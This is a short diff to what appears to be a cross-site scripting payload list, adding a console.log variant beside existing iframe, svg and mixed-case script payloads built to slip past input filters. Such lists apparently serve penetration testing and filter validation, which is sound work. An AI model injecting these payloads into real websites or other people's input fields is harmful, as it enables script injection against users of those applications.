@@ -1,4 +1,5 @@
 <input value=<><iframe/src=javascript:confirm(1)
+<input value=<><iframe/src=javascript:console.log(1)
 <svg><script>//&NewLine;confirm(1);</script </svg>
 <svg%0Aonload=%09((pro\u006dpt))()//
 <sCriPt x>(((confirm)))``</scRipt x>
